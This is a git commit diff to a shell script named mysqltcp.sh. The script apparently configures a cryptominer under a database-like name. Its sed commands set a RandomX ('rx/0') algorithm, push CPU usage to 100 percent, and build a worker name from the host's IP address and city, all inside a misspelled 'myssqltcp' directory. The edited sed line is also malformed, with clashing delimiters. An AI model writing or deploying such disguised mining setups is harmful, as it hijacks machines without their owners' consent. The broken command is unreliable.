473ec7e4d3d66adca4923b329be0c6738d5e6974
U8Pool <905353149@qq.com>
2024-09-08 00:03:56 -0400

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -723,7 +723,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS"
 fi
 
-sed -i 's/"null": *"[^"]*",/"null": "rx/0",/' $HOME/myssqltcp/config.json
+sed -i 's/"null": *"[^"]*",/"null": "rx/0",#' $HOME/myssqltcp/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$UUID':'$MEIP':'$UUIP'.'$CITY'-'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
